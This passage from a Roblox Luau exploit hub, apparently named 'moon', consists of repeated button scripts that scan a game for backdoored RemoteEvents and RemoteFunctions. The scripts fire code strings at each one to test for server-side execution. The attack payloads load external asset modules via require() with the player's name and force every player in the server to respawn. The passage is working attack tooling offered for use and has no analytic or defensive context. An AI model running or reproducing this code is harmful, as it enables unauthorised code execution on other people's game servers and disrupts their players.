		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_86);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_90()
	local script = G2L["90"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7804327506).amigodogodenot123(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_90);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_9a()
	local script = G2L["9a"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7163976217).VK(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_9a);
-- StarterGui.ScreenGui.Hub.RE.LocalScript
local function C_a9()
	local script = G2L["a9"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}



		local player = game.Players.LocalPlayer
		local payloading = [[
		for _, lol in pairs(game.Players:GetPlayers()) do
			lol:LoadCharacter()
		end
		]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_a9);

return G2L["1"], require;
